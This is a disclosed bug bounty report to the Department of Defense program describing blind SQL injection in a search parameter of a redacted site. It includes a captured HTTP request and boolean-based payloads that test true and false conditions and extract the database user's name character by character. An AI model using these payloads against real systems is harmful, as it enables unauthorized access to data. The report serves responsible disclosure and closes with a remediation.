# SqlInject at ██████

## Report Details
- **Report ID**: 2073717
- **URL**: https://hackerone.com/reports/2073717
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-07-18T04:01:55.149Z
- **Disclosed**: 2023-09-08T17:15:41.903Z

## Reporter
- **Username**: kirs_bughunter
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
Dear DoD,
I found the injection at:https://██████/

** Steps to reproduce **
1.open https://██████████/MEDIA/Posters

2.Type in the search box '

█████

3.After capturing packets through burp, the injection point is at searchText

```
GET /API/Evotiva-UserFiles/GetItemsServices/GetItems?itemId=27293&rootItemId=27293&sortExpression=LastModifiedOnDate%2Ctrue&searchText=&searchTags=&take=25&skip=0&page=1&pageSize=25 HTTP/1.1
Host: ███
Tabid: 1236
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"
Requestverificationtoken: V-hXssqxuHlRDyUEJbBTYFASgfr6bkOTeGgemYKdc0jsjPPEhri1fP1l-vJbcSyUMOYiXQ2
Sec-Ch-Ua-Mobile: ?0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Moduleid: 9270
Sec-Ch-Ua-Platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://██████/MEDIA/Posters
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64;) Gecko/20100101 Firefox/20.0
Connection: close

```

4.proof of concept poc  
The following is the poc for ture

```
')AND+22=22+AND+('NaXY'+LIKE+'NaXY
```
████████

5.The following is the poc for false
```
')AND+22=21+AND+('NaXY'+LIKE+'NaXY
```
██████

5.Get the current user length is 22
```
')AND+len(user)=22+AND+('NaXY'+LIKE+'NaXY
```
████

██████

6.Get users from the current database
POC：

Please note! Among them, the fifth character is a special character, we need to match it by ascii code
```
')AND+ascii(substring(user,5,1))='92'+AND+('NaXY'+LIKE+'NaXY
```
The user who finally ran out was ** nase/svc.puub17.zp.safe **

█████

7.Here is a screenshot of sqlmap

█████

## Impact

An attacker can obtain information from the database

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Please see Description

## Suggested Mitigation/Remediation Actions
Use parameterized statements, do not splice sql



## Attachments
No attachments
